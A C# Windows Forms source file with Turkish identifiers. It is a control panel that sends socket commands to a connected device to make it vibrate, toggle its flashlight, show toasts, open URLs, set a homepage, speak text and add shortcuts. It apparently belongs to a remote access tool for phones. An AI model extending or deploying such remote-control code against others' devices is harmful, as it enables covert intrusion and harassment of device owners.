using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SV
{
    public partial class Eglence : Form
    {
        Socket sck; public string ID = "";
        public Eglence(Socket socket, string aydi)
        {
            InitializeComponent();
            sck = socket; ID = aydi;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try { 
            byte[] vibration = Encoding.UTF8.GetBytes("VIBRATION|" + ((int)numericUpDown1.Value * 1000).ToString() + "|");
            Gonderici.Send(sck, vibration, 0, vibration.Length, 59999);
            }
            catch (Exception) { }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            try { 
            byte[] flash = Encoding.UTF8.GetBytes("FLASH|AC|");
            Gonderici.Send(sck, flash, 0, flash.Length, 59999);
            }
            catch (Exception) { }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try { 
            byte[] flash = Encoding.UTF8.GetBytes("FLASH|KAPA|");
            Gonderici.Send(sck, flash, 0, flash.Length, 59999);
            }
            catch (Exception) { }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            try { 
            byte[] toast = Encoding.UTF8.GetBytes("TOST|" + textBox1.Text + "|");
            Gonderici.Send(sck, toast, 0, toast.Length, 59999);
            }
            catch (Exception) { }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            try { 
            byte[] url = Encoding.UTF8.GetBytes("URL|" + textBox2.Text + "|");
            Gonderici.Send(sck, url, 0, url.Length, 59999);
            }
            catch (Exception) { }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            try { 
            byte[] url = Encoding.UTF8.GetBytes("ANASAYFA|" + textBox2.Text + "|");
            Gonderici.Send(sck, url, 0, url.Length, 59999);
            }
            catch (Exception) { }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] url = Encoding.UTF8.GetBytes("KONUS|" + textBox3.Text + "|");
                Gonderici.Send(sck, url, 0, url.Length, 59999);
            }
            catch (Exception) { }
        }
        byte[] ico_bytes = default;
        public byte[] ImageToByteArray(Image imageIn)
        {
            using (var ms = new MemoryStream())
            {
                imageIn.Save(ms, ImageFormat.Png);
                return ms.ToArray();
            }
        }
        private void button9_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog op = new OpenFileDialog()
            { Multiselect = false, Filter = "Resim dosyaları (.jpg .png .jpeg)|*.jpeg;*.png;*.jpg",
                Title = "Bir ikon seçiniz.."})
            {
                if(op.ShowDialog() == DialogResult.OK)
                {
                    pictureBox1.ImageLocation = op.FileName;
                    Image img = ResizeImage(Image.FromFile(op.FileName), 72,72);
                    ico_bytes = ImageToByteArray(img);
                }
            }
        }

        private void button8_Click(object sender, EventArgs e)
        {
            if (pictureBox1.Image != null)
            {
                string icoByteLenght = ico_bytes.Length.ToString();
                byte[] shortcut = Encoding.UTF8.GetBytes("SHORTCUT|" + textBox4.Text + "|" + textBox5.Text + "|" + icoByteLenght + "|");
                Gonderici.Send(sck, shortcut, 0, shortcut.Length, 59999);
                Gonderici.Send(sck, ico_bytes, 0, ico_bytes.Length, 59999);
            }
        }
        public static Bitmap ResizeImage(Image image, int width, int height)
        {
          
            var destRect = new Rectangle(0, 0, width, height);
            var destImage = new Bitmap(width, height);

            destImage.SetResolution(image.HorizontalResolution, image.VerticalResolution);

            using (var graphics = Graphics.FromImage(destImage))
            {
                graphics.CompositingMode = CompositingMode.SourceCopy;
                graphics.CompositingQuality = CompositingQuality.HighQuality;
                graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
                graphics.SmoothingMode = SmoothingMode.HighQuality;
                graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;
             
                using (var wrapMode = new ImageAttributes())
                {
               
                    wrapMode.SetWrapMode(WrapMode.TileFlipXY);
                    graphics.DrawImage(image, destRect, 0, 0, image.Width, image.Height, GraphicsUnit.Pixel, wrapMode);
                }
            }
            return destImage;
        }
        /*
private void trackBar1_MouseUp(object sender, MouseEventArgs e)
{
byte[] url = Encoding.UTF8.GetBytes("PARILTI|" + trackBar1.Value.ToString() + "|");
Gonderici.Send(sck, url, 0, url.Length, 59999);
}
*/
    }
}
